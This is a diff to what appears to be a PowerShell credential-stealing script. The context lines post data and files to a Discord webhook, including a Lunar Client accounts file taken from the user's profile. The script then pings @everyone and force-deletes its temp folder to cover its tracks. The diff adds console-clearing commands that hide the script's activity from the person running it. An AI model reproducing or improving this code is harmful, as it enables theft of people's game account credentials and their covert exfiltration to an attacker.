@@ -94,7 +94,7 @@ param (
 $Body = @{
   'content' = $text
 }
-
+cls
 
 if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $webHookUrl  -Method Post -Body ($Body | ConvertTo-Json)};
@@ -140,7 +140,7 @@ $payload = [PSCustomObject]@{
 }
 
 
-
+cls
 Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
 python C:\temp\UUID.py
 Upload-Discord -file "C:\temp\MicrosoftPolicy.png"
@@ -148,7 +148,8 @@ Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts
 
 Upload-Discord -text "---------------------------------------------------------------------------------------------------------------------------------------------------------"
 Upload-Discord -text "||@everyone||"
+cls
+cd C:\Users\$env:UserName\
 Remove-Item C:\temp -Recurse -Force -Confirm:$false
-#If you opened the folder :/
 pause
 exit
